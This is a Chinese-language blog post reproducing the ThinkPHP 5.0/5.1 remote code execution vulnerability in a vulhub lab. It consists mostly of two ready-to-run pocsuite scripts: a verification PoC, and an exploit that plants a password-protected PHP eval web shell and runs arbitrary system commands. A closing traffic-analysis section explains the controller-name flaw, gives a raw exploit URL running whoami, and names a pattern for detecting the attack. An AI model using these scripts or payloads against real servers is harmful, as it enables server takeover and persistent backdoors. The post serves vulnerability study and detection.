---
layout: post
title:  "ThinkPHP 5.0/5.1 远程代码执行漏洞" 
date:   2019-08-12 15:46:50
categories: Development
author: co0ontty
categories: 安全开发 漏洞复现 ALL
tags: 安全开发 漏洞复现 ALL
describe: 
cover: '/assets/img/posts/00cfba101b23708bbb9c9041dea84cc9.jpg'

---
## ThinkPHP 5.0/5.1 远程代码执行漏洞
## 漏洞概述
ThinkPHP 是一款运用极广的 PHP 开发框架。其版本 5 中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。
### 漏洞环境搭建
可使用 vulhub 环境：`/vulhub/thinkphp/5-rce`
### 漏洞利用
* poc: 

```python
#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urlparse
from pocsuite.api.request import req
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = '2019-08-12'
    createDate = '2019-08-12'
    updateDate = '2019-08-12'
    references = ['https://blog.thinkphp.cn/869075']
    name = 'Thinkphp 5.0.22/5.1.29 远程命令执行漏洞'
    appPowerLink = 'http://www.thinkphp.cn'
    appName = 'Thinkphp'
    appVersion = '5.0.22/5.1.29'
    vulType = '命令执行'
    desc = ''' 
    由于框架对控制器名没有进行足够的检测，会导致在没有开启强制路由的情况下引发 getshell 漏洞。该漏洞影响 5.0.22/5.1.29 版本。
    '''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result = {}
        base_url = self.url
        if (urlparse.urlparse(base_url).port) is None:
            base_url = base_url+":8080"
        verify_str = randomStr(6)
        verify_filename = randomStr(3)
        vul_url = urlparse.urljoin(
            base_url, "index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]={}.php&vars[1][]=<?php echo '{}';?>".format(verify_filename, verify_str))
        create_verify_file = req.get(vul_url)
        verify_url = urlparse.urljoin(base_url, verify_filename+".php")
        get_verify_str = req.get(verify_url)
        if verify_str in get_verify_str.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)
    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

```
* exp:  

```python
#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urlparse
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from pocsuite.lib.core.data import logger
from pocsuite.api.request import req
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = '2019-08-12'
    createDate = '2019-08-12'
    updateDate = '2019-08-12'
    references = ['https://blog.thinkphp.cn/869075']
    name = 'Thinkphp 5.0.22/5.1.29 远程命令执行漏洞'
    appPowerLink = 'http://www.thinkphp.cn'
    appName = 'Thinkphp'
    appVersion = '5.0 - 5.1'
    vulType = '命令执行'
    desc = ''' 
    由于框架对控制器名没有进行足够的检测，会导致在没有开启强制路由的情况下引发getshell漏洞。该漏洞影响 5.0.22/5.1.29 版本。
    '''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result = {}
        base_url = self.url
        if (urlparse.urlparse(base_url).port) is None:
            base_url = base_url+":8080"
        if 'cmd' not in self.params:
            logger.log(CUSTOM_LOGGING.SYSINFO,
                       "You can use --extra-params=\"{'cmd':'whoami'}\" to exec command")
            cmd = 'whoami'
        else:
            cmd = self.params['cmd']
        verify_str = randomStr(6)
        verify_filename = randomStr(3)
        random_shell_pass = randomStr(8)
        upload_url = urlparse.urljoin(
            base_url, "index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]={}.php&vars[1][]=<?php @eval($_POST[{}]);echo'{}';?>".format(verify_filename, random_shell_pass, verify_str))
        cmd_url = urlparse.urljoin(
            base_url, "index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}".format(cmd))
        create_verify_file = req.get(upload_url)
        cmd_response_text = req.get(cmd_url).text
        verify_url = urlparse.urljoin(base_url, verify_filename+".php")
        get_verify_str = req.get(verify_url)
        if verify_str in get_verify_str.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['shellpath'] = verify_url
            result['VerifyInfo']['shellpass'] = random_shell_pass
            result['VerifyInfo']['cmdresult'] = cmd_response_text
        return self.parse_output(result)
    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

```

### 流量分析
该漏洞使用了 
`$this->app->controller`
方法来实例化控制器，然后调用实例中的方法。
跟进 `controller` 方法；
通过 `parseModuleAndClass` 方法解析出 `$module` 和`$class`，
然后实例化`$class`。当`$name` 
以反斜线`\`开始时直接将其作为类名。
利用命名空间的特点，如果可以控制此处的`$name`（即路由中的 controller 部分），
那么就可以实例化任何一个类。

即漏洞利用 poc 为：  
`http://localhost:9096/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami` 
流量检测的时候只需要去检测   
`\app/invokefunction&function`  
实例化类的部分即可判定攻击行为